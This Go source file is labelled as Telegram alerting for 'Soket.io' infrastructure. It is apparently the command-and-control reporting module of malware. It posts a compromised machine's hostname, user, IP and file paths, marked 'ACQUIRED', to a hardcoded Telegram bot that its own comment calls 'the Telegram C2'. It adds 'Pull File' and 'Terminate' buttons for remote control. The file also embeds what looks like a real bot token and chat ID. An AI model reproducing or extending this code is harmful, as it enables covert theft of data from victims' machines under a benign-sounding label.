// Package telegram - Advanced Telegram alerting for Soket.io V1.0 infrastructure.
package telegram

import (
	"fmt"
	"net/http"
	"net/url"
	"time"
)

const (
	DefaultBotToken = "8602911604:AAGZs2G4n1DNFc9zzAcmsZyYdEWP1ARXh80"
	DefaultChatID   = "5439698489"
	TelegramAPIURL  = "https://api.telegram.org/bot%s/sendMessage"
)

// AlertData represents the structured content for a system alert.
type AlertData struct {
	EventType string
	Hostname  string
	User      string
	IP        string
	FilePath  string
	Details   string
}

// SendProfessionalAlert sends a highly structured HTML report to the Telegram C2.
func SendProfessionalAlert(data AlertData) error {
	apiURL := fmt.Sprintf(TelegramAPIURL, DefaultBotToken)

	report := fmt.Sprintf(
		"<b>SYSTEM ALERT: [%s] ACQUIRED</b>\n"+
			"------------------------------------\n"+
			"<b>TARGET:</b> %s\n"+
			"<b>USER:</b>   %s\n"+
			"<b>IP:</b>     %s\n"+
			"<b>PATH:</b>   <code>%s</code>\n"+
			"<b>INFO:</b>   %s\n"+
			"------------------------------------\n"+
			"<i>TIMESTAMP: %s</i>",
		data.EventType,
		data.Hostname,
		data.User,
		data.IP,
		data.FilePath,
		data.Details,
		time.Now().Format("2006-01-02 15:04:05"),
	)

	vals := url.Values{}
	vals.Set("chat_id", DefaultChatID)
	vals.Set("text", report)
	vals.Set("parse_mode", "HTML")

	// Add Interactive Buttons for V2.0
	if data.FilePath != "" && data.FilePath != "N/A" {
		keyboard := fmt.Sprintf(`{"inline_keyboard": [[{"text": "📥 Pull File", "callback_data": "pull:%s"}, {"text": "❌ Terminate", "callback_data": "term"}]]}`, data.FilePath)
		vals.Set("reply_markup", keyboard)
	}

	client := &http.Client{Timeout: 15 * time.Second}
	resp, err := client.PostForm(apiURL, vals)
	if err != nil {
		return fmt.Errorf("transport failure: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("api rejected request: %s", resp.Status)
	}

	return nil
}
